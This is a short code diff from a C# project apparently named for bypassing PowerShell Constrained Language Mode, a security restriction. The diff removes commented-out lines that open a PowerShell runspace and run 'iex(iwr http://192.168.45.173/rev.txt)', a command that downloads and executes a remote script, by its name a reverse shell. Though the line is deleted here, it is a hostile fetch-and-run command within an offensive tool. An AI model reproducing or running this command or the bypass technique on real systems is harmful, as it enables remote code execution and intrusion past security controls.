@@ -26,12 +26,6 @@ namespace PsBypassCostraintLanguageMode
 
                 );
 
-
-            //Runspace runspace2 = RunspaceFactory.CreateRunspace();
-            //runspace2.Open();
-            //RunspaceInvoke runSpaceInvoker2 = new RunspaceInvoke(runspace2);
-            //runSpaceInvoker.Invoke("iex(iwr http://192.168.45.173/rev.txt -UseBasicParsing)");
-
         }
     }
 
